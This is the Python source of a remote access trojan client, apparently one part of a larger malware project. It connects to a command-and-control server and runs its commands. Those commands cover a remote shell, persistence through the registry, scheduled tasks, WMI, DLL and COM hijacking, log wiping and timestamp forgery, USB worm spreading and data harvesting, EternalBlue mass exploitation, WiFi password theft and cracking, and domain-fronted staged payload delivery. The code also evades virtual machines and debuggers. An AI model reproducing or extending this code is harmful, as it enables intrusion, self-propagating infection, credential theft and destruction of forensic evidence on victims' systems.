import socket
import ssl
import json
import threading
import subprocess
import os
import sys
import time
import signal
import atexit
from datetime import datetime
import psutil

from utils.anti_vm import VMDetector
from utils.code_obfuscation import Obfuscator
from utils.crypto import CryptoManager
from utils.memory_protection import MemoryProtector
from utils.network_protection import NetworkProtector
from utils.cert_pinning import CertificatePinner
from utils.advanced_protection import ProcessProtector
from payload.modules.persistence import Persistence
from payload.modules.process_migration import ProcessMigrator
from payload.modules.anti_forensics import AntiForensics
from payload.modules.usb_spreading import USBSpreader, USBDataHarvester
from payload.modules.eternalblue import EternalBlueExploit
from payload.modules.wifi_attacks import WiFiAttackSuite
from payload.modules.domain_fronting import DomainFronting
from payload.modules.staged_delivery import StagedPayloadDelivery
from payload.modules.advanced_persistence import AdvancedPersistence

class Client:
    def __init__(self, host='localhost', port=4444):
        self.host = host
        self.port = port
        self.connected = False
        self.session_key = None
        
        # Thread safety locks
        self._connection_lock = threading.RLock()
        self._cleanup_lock = threading.Lock()
        self._shutdown_event = threading.Event()
        self._operations_lock = threading.Lock()
        self._initialized = False
        
        # Khởi tạo các components với thread safety
        self._initialize_components()
        
        # Shell capability
        self.shell = None
    
    def _initialize_components(self):
        """Thread-safe component initialization"""
        with self._operations_lock:
            if self._initialized:
                return
                
            try:
                # Khởi tạo các components
                self.crypto = CryptoManager()
                self.memory_protector = MemoryProtector()
                self.network_protector = NetworkProtector()
                self.cert_pinner = CertificatePinner()
                self.process_protector = ProcessProtector()
                self.persistence = Persistence()
                self.migrator = ProcessMigrator()
                self.anti_forensics = AntiForensics()
                self.usb_spreader = USBSpreader()
                self.usb_harvester = USBDataHarvester()
                self.eternalblue = EternalBlueExploit()
                self.wifi_attacks = WiFiAttackSuite()
                self.domain_fronting = DomainFronting()
                self.staged_delivery = StagedPayloadDelivery()
                self.advanced_persistence = AdvancedPersistence()
                
                # Anti-analysis check
                if not self.check_environment():
                    self._safe_exit(1)
                    
                # Stealth mode
                self.enable_stealth_mode()
                
                # Setup emergency cleanup handlers (only once)
                self.setup_emergency_cleanup()
                
                self._initialized = True
                
            except Exception as e:
                print(f"Component initialization failed: {str(e)}")
                self._safe_exit(1)
        
    def check_environment(self):
        """Kiểm tra môi trường chạy"""
        try:
            vm_detector = VMDetector()
            
            # Kiểm tra VM
            if vm_detector.detect_vm():
                return False
                
            # Kiểm tra debugger
            if vm_detector.detect_debugger():
                return False
                
            # Kiểm tra sandbox
            if vm_detector.detect_sandbox():
                return False
                
            return True
            
        except Exception:
                        return False
            
    def enable_stealth_mode(self):
        """Kích hoạt stealth mode"""
        try:
            # Ẩn process
            self.process_protector.hide_process()
            
            # Cài đặt persistence
            self.persistence.install_registry()
            self.persistence.install_task_scheduler()
            
            # Khởi động anti-forensics continuous cleanup
            self.anti_forensics.start_continuous_cleanup(interval=600)  # Every 10 minutes
            
            # Initial cleanup để xóa dấu vết khởi động
            self.anti_forensics.execute_cleanup(quick_mode=True)
            self.persistence.install_wmi()
              # Bảo vệ memory
            self.memory_protector.protect_memory()
            
        except Exception as e:
            print(f"Stealth mode error: {str(e)}")
    
    def setup_emergency_cleanup(self):
        """Setup emergency cleanup handlers"""
        try:
            # Register signal handlers for emergency cleanup
            signal.signal(signal.SIGTERM, self.emergency_shutdown)
            signal.signal(signal.SIGINT, self.emergency_shutdown)
            
            # Register atexit handler for normal termination
            atexit.register(self.cleanup_on_exit)
            
        except Exception as e:
            print(f"Failed to setup emergency cleanup: {str(e)}")
    
    def emergency_shutdown(self, signum, frame):
        """Handle emergency shutdown signals"""
        try:
            print(f"Emergency shutdown triggered by signal {signum}")
            
            # Execute emergency cleanup
            self.anti_forensics.emergency_cleanup()
            
            # Stop continuous cleanup
            self.anti_forensics.stop_continuous_cleanup()
            
            # Remove persistence if possible
            try:
                self.persistence.remove_persistence()
            except:
                pass
            
            # Clean up network connections
            if hasattr(self, 'socket') and self.socket:
                try:
                    self.socket.close()
                except:
                    pass
            
            # Exit immediately
            os._exit(0)
            
        except Exception:
            # If anything fails, just exit
            os._exit(1)
    
    def cleanup_on_exit(self):
        """Cleanup function called on normal exit"""
        try:
            # Execute quick cleanup
            self.anti_forensics.execute_cleanup(quick_mode=True)
            
            # Stop continuous cleanup
            self.anti_forensics.stop_continuous_cleanup()
            
            # Clean network traces
            self.anti_forensics.cleanup_network_traces()
            
            # Manipulate timestamps of critical files
            critical_paths = [
                os.path.abspath(__file__),
                os.path.dirname(os.path.abspath(__file__))
            ]
            
            for path in critical_paths:
                try:
                    self.anti_forensics.manipulate_timestamps(path)
                except:
                    pass
                    
        except Exception:
            pass
            
    def connect(self):
        """Kết nối tới C&C server"""
        while True:
            try:
                # Tạo SSL context
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                # Kết nối socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket = ssl_context.wrap_socket(sock)
                self.socket.connect((self.host, self.port))
                
                # Verify server certificate
                server_cert = self.socket.getpeercert(binary_form=True)
                if not self.cert_pinner.verify_cert(server_cert):
                    raise Exception("Invalid server certificate")
                    
                # Nhận session key
                encrypted_key = self.socket.recv(4096)
                self.session_key = self.crypto.decrypt_key(encrypted_key)
                
                self.connected = True
                print(f"Connected to {self.host}:{self.port}")
                
                # Start monitoring thread
                threading.Thread(target=self.monitor_process, daemon=True).start()
                
                # Main loop
                self.handle_connection()
                
            except Exception as e:
                print(f"Connection error: {str(e)}")
                time.sleep(60)  # Retry after 1 minute
                
    def handle_connection(self):
        """Xử lý connection"""
        try:
            while self.connected:
                # Receive encrypted command
                encrypted_data = self.socket.recv(4096)
                if not encrypted_data:
                    break
                    
                # Decrypt command    
                data = self.crypto.decrypt(encrypted_data, self.session_key)
                command = json.loads(data)
                
                # Execute command
                response = self.execute_command(command)
                
                # Encrypt and send response
                encrypted_response = self.crypto.encrypt(json.dumps(response), self.session_key)
                self.socket.send(encrypted_response)
                
        except Exception as e:
            print(f"Connection error: {str(e)}")
            self.connected = False
            
    def execute_command(self, command):
        """Thực thi command"""
        try:
            cmd = command.get('command')
            
            if cmd == 'shell':
                # Interactive shell
                if not self.shell:
                    self.shell = subprocess.Popen(
                        ['cmd.exe' if os.name == 'nt' else '/bin/sh'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        shell=True
                    )
                  # Execute shell command
                self.shell.stdin.write(f"{command.get('data')}\n".encode())
                self.shell.stdin.flush()
                output = self.shell.stdout.readline().decode()
                return {'status': 'success', 'output': output}
                
            elif cmd == 'migrate':
                # Process migration
                target_pid = command.get('pid')
                if self.migrator.migrate(target_pid):
                    return {'status': 'success', 'message': f'Migrated to process {target_pid}'}
                return {'status': 'error', 'message': 'Migration failed'}
                
            elif cmd == 'persistence':
                # Manage persistence
                action = command.get('action')
                if action == 'install':
                    self.persistence.install_registry()
                    self.persistence.install_task_scheduler()
                    self.persistence.install_wmi()
                    return {'status': 'success', 'message': 'Persistence installed'}
                elif action == 'remove':
                    results = self.persistence.remove_persistence()
                    return {'status': 'success', 'message': results}
                elif action == 'status':
                    status = self.persistence.check_persistence()
                    return {'status': 'success', 'data': status}
                    
            elif cmd == 'sysinfo':
                # System information
                info = {
                    'hostname': socket.gethostname(),
                    'ip': socket.gethostbyname(socket.gethostname()),
                    'os': os.name,
                    'cpu': psutil.cpu_percent(),
                    'memory': psutil.virtual_memory().percent,
                    'processes': len(psutil.pids())
                }
                return {'status': 'success', 'data': info}
                
            elif cmd == 'anti_forensics':
                # Anti-forensics operations
                action = command.get('action')
                
                if action == 'cleanup':
                    # Execute immediate cleanup
                    quick_mode = command.get('quick_mode', False)
                    result = self.anti_forensics.execute_cleanup(quick_mode=quick_mode)
                    return {'status': 'success', 'message': 'Cleanup completed', 'data': result}
                    
                elif action == 'emergency_cleanup':
                    # Emergency cleanup with maximum stealth
                    result = self.anti_forensics.emergency_cleanup()
                    return {'status': 'success', 'message': 'Emergency cleanup completed', 'data': result}
                    
                elif action == 'clear_logs':
                    # Clear specific logs
                    log_type = command.get('log_type', 'all')
                    if log_type == 'event':
                        self.anti_forensics.clear_event_logs()
                    elif log_type == 'iis':
                        self.anti_forensics.clear_iis_logs()
                    elif log_type == 'usn':
                        self.anti_forensics.clear_usn_journal()
                    else:
                        self.anti_forensics.clear_event_logs()
                        self.anti_forensics.clear_iis_logs()
                        self.anti_forensics.clear_usn_journal()
                    return {'status': 'success', 'message': f'Cleared {log_type} logs'}
                    
                elif action == 'remove_artifacts':
                    # Remove file artifacts
                    paths = command.get('paths', [])
                    if paths:
                        for path in paths:
                            self.anti_forensics.secure_delete_file(path)
                    else:
                        self.anti_forensics.cleanup_file_artifacts()
                    return {'status': 'success', 'message': 'File artifacts removed'}
                    
                elif action == 'clean_registry':
                    # Clean registry traces
                    self.anti_forensics.cleanup_registry_traces()
                    return {'status': 'success', 'message': 'Registry traces cleaned'}
                    
                elif action == 'clean_network':
                    # Clean network traces
                    self.anti_forensics.cleanup_network_traces()
                    return {'status': 'success', 'message': 'Network traces cleaned'}
                    
                elif action == 'clean_browser':
                    # Clean browser data
                    browsers = command.get('browsers', ['chrome', 'firefox', 'edge'])
                    for browser in browsers:
                        self.anti_forensics.cleanup_browser_data(browser)
                    return {'status': 'success', 'message': f'Browser data cleaned for {browsers}'}
                    
                elif action == 'manipulate_timestamps':
                    # Manipulate file timestamps
                    target_path = command.get('path')
                    if target_path:
                        self.anti_forensics.manipulate_timestamps(target_path)
                        return {'status': 'success', 'message': f'Timestamps manipulated for {target_path}'}
                    return {'status': 'error', 'message': 'Path required for timestamp manipulation'}
                    
                elif action == 'status':
                    # Get cleanup status
                    status = self.anti_forensics.get_cleanup_status()
                    return {'status': 'success', 'data': status}
                    
                elif action == 'start_continuous':
                    # Start continuous cleanup
                    interval = command.get('interval', 600)  # Default 10 minutes
                    self.anti_forensics.start_continuous_cleanup(interval=interval)
                    return {'status': 'success', 'message': f'Continuous cleanup started with {interval}s interval'}
                    
                elif action == 'stop_continuous':                    # Stop continuous cleanup
                    self.anti_forensics.stop_continuous_cleanup()
                    return {'status': 'success', 'message': 'Continuous cleanup stopped'}
                
                return {'status': 'error', 'message': 'Unknown anti-forensics action'}
                
            elif cmd == 'usb_spreading':
                # USB spreading operations
                action = command.get('action')
                
                if action == 'start_monitoring':
                    # Start USB monitoring
                    success = self.usb_spreader.start_monitoring()
                    return {'status': 'success' if success else 'error', 
                           'message': 'USB monitoring started' if success else 'Failed to start USB monitoring'}
                    
                elif action == 'stop_monitoring':
                    # Stop USB monitoring
                    self.usb_spreader.stop_monitoring()
                    return {'status': 'success', 'message': 'USB monitoring stopped'}
                    
                elif action == 'infect_all':
                    # Infect all connected USB drives
                    count = self.usb_spreader.infect_all_usb_drives()
                    return {'status': 'success', 'message': f'Infected {count} USB drives'}
                    
                elif action == 'harvest_data':
                    # Harvest data from USB drives
                    target_dir = command.get('target_dir', 'C:\\temp\\usb_data')
                    harvested = self.usb_harvester.auto_harvest_usb_devices(target_dir)
                    return {'status': 'success', 'data': harvested, 'message': f'Harvested data from {len(harvested)} drives'}
                    
                elif action == 'status':
                    # Get USB spreading status
                    status = self.usb_spreader.get_infection_status()
                    return {'status': 'success', 'data': status}
                    
                elif action == 'cleanup':
                    # Clean USB infection
                    drive_path = command.get('drive_path')
                    if drive_path:
                        success = self.usb_spreader.cleanup_usb_infection(drive_path)
                        return {'status': 'success' if success else 'error',
                               'message': f'Cleanup {"successful" if success else "failed"} for {drive_path}'}
                    return {'status': 'error', 'message': 'Drive path required'}
                    
                return {'status': 'error', 'message': 'Unknown USB spreading action'}
                
            elif cmd == 'eternalblue':
                # EternalBlue exploit operations
                action = command.get('action')
                
                if action == 'scan':
                    # Scan network for vulnerable hosts
                    network_range = command.get('network_range', '192.168.1.0/24')
                    vulnerable_hosts = self.eternalblue.scan_network_for_vulnerable_hosts(network_range)
                    return {'status': 'success', 'data': vulnerable_hosts, 
                           'message': f'Found {len(vulnerable_hosts)} vulnerable hosts'}
                    
                elif action == 'exploit':
                    # Exploit single target
                    target_ip = command.get('target_ip')
                    callback_ip = command.get('callback_ip', '127.0.0.1')
                    callback_port = command.get('callback_port', 4444)
                    
                    if not target_ip:
                        return {'status': 'error', 'message': 'Target IP required'}
                    
                    payload = self.eternalblue.generate_payload(callback_ip, callback_port)
                    success = self.eternalblue.exploit_target(target_ip, payload)
                    
                    return {'status': 'success' if success else 'error',
                           'message': f'Exploit {"successful" if success else "failed"} against {target_ip}'}
                    
                elif action == 'mass_exploit':
                    # Mass exploitation
                    target_list = command.get('target_list', [])
                    callback_ip = command.get('callback_ip', '127.0.0.1')
                    callback_port = command.get('callback_port', 4444)
                    
                    if not target_list:
                        return {'status': 'error', 'message': 'Target list required'}
                    
                    payload = self.eternalblue.generate_payload(callback_ip, callback_port)
                    results = self.eternalblue.mass_exploit(target_list, payload)
                    
                    successful = sum(1 for r in results.values() if r)
                    return {'status': 'success', 'data': results,
                           'message': f'Successfully exploited {successful}/{len(target_list)} targets'}
                    
                elif action == 'create_worm':
                    # Create worm payload
                    target_binary = command.get('target_binary', __file__)
                    worm_payload = self.eternalblue.create_worm_payload(target_binary)
                    
                    if worm_payload:
                        worm_path = 'C:\\temp\\worm_payload.exe'
                        with open(worm_path, 'wb') as f:
                            f.write(worm_payload)
                        return {'status': 'success', 'message': f'Worm payload created: {worm_path}'}
                    return {'status': 'error', 'message': 'Failed to create worm payload'}
                    
                elif action == 'report':
                    # Get exploitation report
                    report = self.eternalblue.get_exploitation_report()
                    return {'status': 'success', 'data': report}
                    
                return {'status': 'error', 'message': 'Unknown EternalBlue action'}
                
            elif cmd == 'wifi_attacks':
                # WiFi attack operations
                action = command.get('action')
                
                if action == 'scan':
                    # Scan WiFi networks
                    networks = self.wifi_attacks.scan_wifi_networks()
                    return {'status': 'success', 'data': networks,
                           'message': f'Found {len(networks)} WiFi networks'}
                    
                elif action == 'extract_passwords':
                    # Extract saved WiFi passwords
                    passwords = self.wifi_attacks.extract_saved_passwords()
                    return {'status': 'success', 'data': passwords,
                           'message': f'Extracted {len(passwords)} saved passwords'}
                    
                elif action == 'evil_twin':
                    # Create evil twin access point
                    ssid = command.get('ssid', 'Free_WiFi')
                    password = command.get('password', 'password123')
                    
                    success = self.wifi_attacks.create_fake_access_point(ssid, password)
                    return {'status': 'success' if success else 'error',
                           'message': f'Evil twin {"created" if success else "failed"}: {ssid}'}
                    
                elif action == 'stop_evil_twin':
                    # Stop evil twin
                    success = self.wifi_attacks.stop_fake_access_point()
                    return {'status': 'success' if success else 'error',
                           'message': 'Evil twin stopped' if success else 'Failed to stop evil twin'}
                    
                elif action == 'deauth':
                    # Deauthentication attack
                    target_bssid = command.get('target_bssid')
                    client_mac = command.get('client_mac')
                    
                    if not target_bssid:
                        return {'status': 'error', 'message': 'Target BSSID required'}
                    
                    success = self.wifi_attacks.perform_deauth_attack(target_bssid, client_mac)
                    return {'status': 'success' if success else 'error',
                           'message': f'Deauth attack {"successful" if success else "failed"}'}
                    
                elif action == 'capture_handshake':
                    # Capture WPA handshake
                    target_ssid = command.get('target_ssid')
                    duration = command.get('duration', 60)
                    
                    if not target_ssid:
                        return {'status': 'error', 'message': 'Target SSID required'}
                    
                    success = self.wifi_attacks.capture_handshakes(target_ssid, duration)
                    return {'status': 'success' if success else 'error',
                           'message': f'Handshake capture {"successful" if success else "failed"}'}
                    
                elif action == 'crack_password':
                    # Crack WPA password
                    ssid = command.get('ssid')
                    wordlist = command.get('wordlist', 'C:\\temp\\wordlist.txt')
                    
                    if not ssid:
                        return {'status': 'error', 'message': 'SSID required'}
                    
                    password = self.wifi_attacks.crack_wpa_password(ssid, wordlist)
                    if password:
                        return {'status': 'success', 'data': {'password': password},
                               'message': f'Password cracked for {ssid}: {password}'}
                    return {'status': 'error', 'message': f'Failed to crack password for {ssid}'}
                    
                elif action == 'wps_scan':
                    # Scan for WPS networks
                    wps_networks = self.wifi_attacks.scan_for_wps_networks()
                    return {'status': 'success', 'data': wps_networks,
                           'message': f'Found {len(wps_networks)} WPS-enabled networks'}
                    
                elif action == 'wps_attack':
                    # WPS PIN attack
                    target_ssid = command.get('target_ssid')
                    
                    if not target_ssid:
                        return {'status': 'error', 'message': 'Target SSID required'}
                    
                    password = self.wifi_attacks.perform_wps_pin_attack(target_ssid)
                    if password:
                        return {'status': 'success', 'data': {'password': password},
                               'message': f'WPS attack successful: {password}'}
                    return {'status': 'error', 'message': 'WPS attack failed'}
                    
                elif action == 'pmkid':
                    # PMKID attack
                    target_bssid = command.get('target_bssid')
                    
                    if not target_bssid:
                        return {'status': 'error', 'message': 'Target BSSID required'}
                    
                    success = self.wifi_attacks.perform_pmkid_attack(target_bssid)
                    return {'status': 'success' if success else 'error',
                           'message': f'PMKID attack {"successful" if success else "failed"}'}
                    
                elif action == 'report':
                    # Get WiFi attack report
                    report = self.wifi_attacks.get_attack_report()
                    return {'status': 'success', 'data': report}
                    
                elif action == 'export':
                    # Export results
                    output_file = command.get('output_file', 'C:\\temp\\wifi_results.json')
                    success = self.wifi_attacks.export_results(output_file)
                    return {'status': 'success' if success else 'error',
                           'message': f'Results exported to {output_file}' if success else 'Export failed'}
                else:
                    return {'status': 'error', 'message': 'Unknown WiFi attack action'}
                
            elif cmd == 'domain_fronting':
                # Domain fronting operations
                action = command.get('action')
                
                if action == 'test_domains':
                    # Test available fronting domains
                    working_domains = self.domain_fronting.test_fronting_domains()
                    return {'status': 'success', 'data': working_domains,
                           'message': f'Found {len(working_domains)} working domains'}
                    
                elif action == 'fronted_request':
                    # Make domain fronted request
                    real_host = command.get('real_host')
                    real_path = command.get('real_path', '/')
                    method = command.get('method', 'GET')
                    data = command.get('data')
                    
                    response = self.domain_fronting.send_with_multiple_fronts(
                        real_host, real_path, data, method)
                    
                    if response:
                        return {'status': 'success', 'data': response.text[:1000],
                               'message': f'Request successful (status: {response.status_code})'}
                    else:
                        return {'status': 'error', 'message': 'Domain fronted request failed'}
                        
                elif action == 'adaptive_request':
                    # Adaptive domain fronting
                    real_host = command.get('real_host')
                    real_path = command.get('real_path', '/')
                    data = command.get('data')
                    
                    response = self.domain_fronting.adaptive_fronting(real_host, real_path, data)
                    
                    if response:
                        return {'status': 'success', 'data': response.text[:1000],
                               'message': 'Adaptive fronting successful'}
                    else:
                        return {'status': 'error', 'message': 'Adaptive fronting failed'}
                        
                elif action == 'start_cover_traffic':
                    # Start cover traffic generation
                    self.domain_fronting.create_legitimate_cover_traffic()
                    return {'status': 'success', 'message': 'Cover traffic started'}
                    
                elif action == 'rotate_infrastructure':
                    # Rotate fronting infrastructure
                    self.domain_fronting.rotate_infrastructure()
                    return {'status': 'success', 'message': 'Infrastructure rotated'}
                    
                return {'status': 'error', 'message': 'Unknown domain fronting action'}
                
            elif cmd == 'staged_delivery':
                # Staged payload delivery operations
                action = command.get('action')
                
                if action == 'create_stage':
                    # Create new payload stage
                    stage_id = command.get('stage_id')
                    stage_type = command.get('stage_type', 1)
                    payload_code = command.get('payload_code')
                    dependencies = command.get('dependencies', [])
                    conditions = command.get('conditions', {})
                    
                    stage = self.staged_delivery.create_stage(
                        stage_id, stage_type, payload_code, dependencies, conditions)
                    
                    if stage:
                        return {'status': 'success', 'data': stage,
                               'message': f'Stage {stage_id} created successfully'}
                    else:
                        return {'status': 'error', 'message': 'Stage creation failed'}
                        
                elif action == 'execute_stage':
                    # Execute single stage
                    stage_id = command.get('stage_id')
                    module = self.staged_delivery.load_stage_in_memory(stage_id)
                    
                    if module:
                        return {'status': 'success', 'message': f'Stage {stage_id} executed'}
                    else:
                        return {'status': 'error', 'message': f'Stage {stage_id} execution failed'}
                        
                elif action == 'execute_sequence':
                    # Execute stage sequence
                    stage_sequence = command.get('stage_sequence', [])
                    success = self.staged_delivery.execute_stage_sequence(stage_sequence)
                    
                    return {'status': 'success' if success else 'error',
                           'message': 'Stage sequence executed' if success else 'Sequence execution failed'}
                    
                elif action == 'list_stages':
                    # List all stages
                    stages_info = {}
                    for stage_id, stage in self.staged_delivery.stages.items():
                        stages_info[stage_id] = {
                            'type': stage['type'],
                            'size': stage['size'],
                            'created': stage['created'],
                            'executed': stage['executed'],
                            'dependencies': stage['dependencies']
                        }
                    
                    return {'status': 'success', 'data': stages_info,
                           'message': f'Found {len(stages_info)} stages'}
                    
                elif action == 'deliver_http_chunked':
                    # HTTP chunked delivery
                    stage_id = command.get('stage_id')
                    target_url = command.get('target_url')
                    
                    success = self.staged_delivery.deliver_via_http_chunked(stage_id, target_url)
                    return {'status': 'success' if success else 'error',
                           'message': 'HTTP chunked delivery completed' if success else 'Delivery failed'}
                    
                elif action == 'deliver_steganography':
                    # Steganographic delivery
                    stage_id = command.get('stage_id')
                    cover_image = command.get('cover_image_path')
                    output_path = command.get('output_path')
                    
                    success = self.staged_delivery.deliver_via_steganography(
                        stage_id, cover_image, output_path)
                    return {'status': 'success' if success else 'error',
                           'message': 'Steganographic delivery completed' if success else 'Delivery failed'}
                    
                elif action == 'extract_steganography':
                    # Extract from steganographic image
                    stego_image = command.get('stego_image_path')
                    payload = self.staged_delivery.extract_from_steganography(stego_image)
                    
                    if payload:
                        return {'status': 'success', 'data': payload[:500],
                               'message': 'Payload extracted from steganography'}
                    else:
                        return {'status': 'error', 'message': 'Steganographic extraction failed'}
                        
                elif action == 'deliver_dns_tunneling':
                    # DNS tunneling delivery
                    stage_id = command.get('stage_id')
                    dns_server = command.get('dns_server')
                    
                    success = self.staged_delivery.deliver_via_dns_tunneling(stage_id, dns_server)
                    return {'status': 'success' if success else 'error',
                           'message': 'DNS tunneling delivery completed' if success else 'Delivery failed'}
                    
                elif action == 'adaptive_selection':                    # Adaptive stage selection
                    target_info = command.get('target_info', {})
                    selected_stages = self.staged_delivery.adaptive_stage_delivery(target_info)
                    
                    return {'status': 'success', 'data': selected_stages,
                           'message': f'Selected {len(selected_stages)} adaptive stages'}
                    
                elif action == 'create_dropper':
                    # Create standalone dropper
                    stages = command.get('stages', [])
                    output_path = command.get('output_path')
                    
                    success = self.staged_delivery.create_payload_dropper(stages, output_path)
                    return {'status': 'success' if success else 'error',
                           'message': f'Dropper created at {output_path}' if success else 'Dropper creation failed'}
                    
                elif action == 'self_destruct':
                    # Self-destruct stage
                    stage_id = command.get('stage_id')
                    success = self.staged_delivery.self_destruct_stage(stage_id)
                    
                    return {'status': 'success' if success else 'error',
                           'message': f'Stage {stage_id} self-destructed' if success else 'Self-destruct failed'}
                else:
                    return {'status': 'error', 'message': 'Unknown staged delivery action'}
                
            elif cmd == 'advanced_persistence':
                # Advanced persistence operations
                action = command.get('action')
                
                if action == 'install_comprehensive':
                    # Install comprehensive persistence
                    results = self.advanced_persistence.install_comprehensive_persistence()
                    success_count = sum(1 for success in results.values() if success)
                    
                    return {'status': 'success', 'data': results,
                           'message': f'Installed {success_count}/{len(results)} persistence mechanisms'}
                    
                elif action == 'install_registry':
                    # Install registry persistence
                    success = self.advanced_persistence.install_registry_run()
                    return {'status': 'success' if success else 'error',
                           'message': 'Registry persistence installed' if success else 'Registry persistence failed'}
                    
                elif action == 'install_service':
                    # Install service persistence
                    success = self.advanced_persistence.install_service()
                    return {'status': 'success' if success else 'error',
                           'message': 'Service persistence installed' if success else 'Service persistence failed'}
                    
                elif action == 'install_scheduled_task':
                    # Install scheduled task persistence
                    success = self.advanced_persistence.install_scheduled_task()
                    return {'status': 'success' if success else 'error',
                           'message': 'Scheduled task persistence installed' if success else 'Task persistence failed'}
                    
                elif action == 'install_startup_folder':
                    # Install startup folder persistence
                    success = self.advanced_persistence.install_startup_folder()
                    return {'status': 'success' if success else 'error',
                           'message': 'Startup folder persistence installed' if success else 'Startup persistence failed'}
                    
                elif action == 'install_dll_hijacking':
                    # Install DLL hijacking persistence
                    success = self.advanced_persistence.install_dll_hijacking()
                    return {'status': 'success' if success else 'error',
                           'message': 'DLL hijacking persistence installed' if success else 'DLL hijacking failed'}
                    
                elif action == 'install_wmi_event':
                    # Install WMI event persistence
                    success = self.advanced_persistence.install_wmi_event()
                    return {'status': 'success' if success else 'error',
                           'message': 'WMI event persistence installed' if success else 'WMI persistence failed'}
                    
                elif action == 'install_com_hijacking':
                    # Install COM hijacking persistence
                    success = self.advanced_persistence.install_com_hijacking()
                    return {'status': 'success' if success else 'error',
                           'message': 'COM hijacking persistence installed' if success else 'COM hijacking failed'}
                    
                elif action == 'install_netsh_helper':
                    # Install netsh helper persistence
                    success = self.advanced_persistence.install_netsh_helper()
                    return {'status': 'success' if success else 'error',
                           'message': 'Netsh helper persistence installed' if success else 'Netsh helper failed'}
                    
                elif action == 'install_image_hijacking':
                    # Install image hijacking persistence
                    success = self.advanced_persistence.install_image_hijacking()
                    return {'status': 'success' if success else 'error',
                           'message': 'Image hijacking persistence installed' if success else 'Image hijacking failed'}
                    
                elif action == 'install_logon_script':
                    # Install logon script persistence
                    success = self.advanced_persistence.install_logon_script()
                    return {'status': 'success' if success else 'error',
                           'message': 'Logon script persistence installed' if success else 'Logon script failed'}
                    
                elif action == 'verify':
                    # Verify persistence mechanisms
                    verification = self.advanced_persistence.verify_persistence()
                    active_count = sum(1 for is_active in verification.values() if is_active)
                    
                    return {'status': 'success', 'data': verification,
                           'message': f'{active_count}/{len(verification)} persistence mechanisms are active'}
                    
                elif action == 'repair':
                    # Repair broken persistence
                    repair_results = self.advanced_persistence.repair_persistence()
                    repaired_count = sum(1 for success in repair_results.values() if success)
                    
                    return {'status': 'success', 'data': repair_results,
                           'message': f'Repaired {repaired_count}/{len(repair_results)} persistence mechanisms'}
                    
                elif action == 'cleanup':
                    # Cleanup all persistence
                    success = self.advanced_persistence.cleanup_persistence()
                    return {'status': 'success' if success else 'error',
                           'message': 'Persistence cleanup completed' if success else 'Cleanup failed'}
                    
                elif action == 'status':
                    # Get persistence status
                    status_info = {
                        'installed_methods': list(self.advanced_persistence.installed_methods.keys()),
                        'backup_locations': self.advanced_persistence.backup_locations,
                        'available_vectors': list(self.advanced_persistence.vectors.keys())
                    }
                    
                    return {'status': 'success', 'data': status_info,
                           'message': f'Found {len(status_info["installed_methods"])} installed persistence methods'}
                    
                return {'status': 'error', 'message': 'Unknown advanced persistence action'}
                
            return {'status': 'error', 'message': 'Unknown command'}
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
            
    def monitor_process(self):
        """Monitor process for anti-debugging"""
        while self.connected:
            try:
                # Check for debugger
                if self.process_protector.detect_debugger():
                    # Migrate to new process
                    target_pid = self.migrator.find_target_process()
                    self.migrator.migrate(target_pid)
                    
                # Check persistence
                persistence_status = self.persistence.check_persistence()
                if not all(persistence_status.values()):
                    self.persistence.install_registry()
                    self.persistence.install_task_scheduler()
                    self.persistence.install_wmi()
                    
                time.sleep(30)  # Check every 30 seconds
                
            except Exception:
                pass
    
    def setup_emergency_cleanup(self):
        """Setup emergency cleanup handlers"""
        try:
            # Register signal handlers for emergency cleanup
            signal.signal(signal.SIGTERM, self.emergency_shutdown)
            signal.signal(signal.SIGINT, self.emergency_shutdown)
            
            # Register atexit handler for normal termination
            atexit.register(self.cleanup_on_exit)
            
        except Exception as e:
            print(f"Failed to setup emergency cleanup: {str(e)}")
    
    def emergency_shutdown(self, signum, frame):
        """Handle emergency shutdown signals"""
        try:
            print(f"Emergency shutdown triggered by signal {signum}")
            
            # Execute emergency cleanup
            self.anti_forensics.emergency_cleanup()
            
            # Stop continuous cleanup
            self.anti_forensics.stop_continuous_cleanup()
            
            # Remove persistence if possible
            try:
                self.persistence.remove_persistence()
            except:
                pass
            
            # Clean up network connections
            if hasattr(self, 'socket') and self.socket:
                try:
                    self.socket.close()
                except:
                    pass
            
            # Exit immediately
            os._exit(0)
            
        except Exception:
            # If anything fails, just exit
            os._exit(1)
    
    def cleanup_on_exit(self):
        """Cleanup function called on normal exit"""
        try:
            # Execute quick cleanup
            self.anti_forensics.execute_cleanup(quick_mode=True)
            
            # Stop continuous cleanup
            self.anti_forensics.stop_continuous_cleanup()
            
            # Clean network traces
            self.anti_forensics.cleanup_network_traces()
            
            # Manipulate timestamps of critical files
            critical_paths = [
                os.path.abspath(__file__),
                os.path.dirname(os.path.abspath(__file__))
            ]
            
            for path in critical_paths:
                try:
                    self.anti_forensics.manipulate_timestamps(path)
                except:
                    pass
                    
        except Exception:
            pass

    def _safe_exit(self, code=0):
        """Thread-safe exit method"""
        try:
            with self._cleanup_lock:
                if not self._shutdown_event.is_set():
                    self._shutdown_event.set()
                    # Execute quick cleanup
                    if hasattr(self, 'anti_forensics'):
                        self.anti_forensics.execute_cleanup(quick_mode=True)
                    sys.exit(code)
        except:
            os._exit(code)

if __name__ == '__main__':
    # Obfuscate code
    Obfuscator.obfuscate_self()
    
    client = Client()
    client.connect()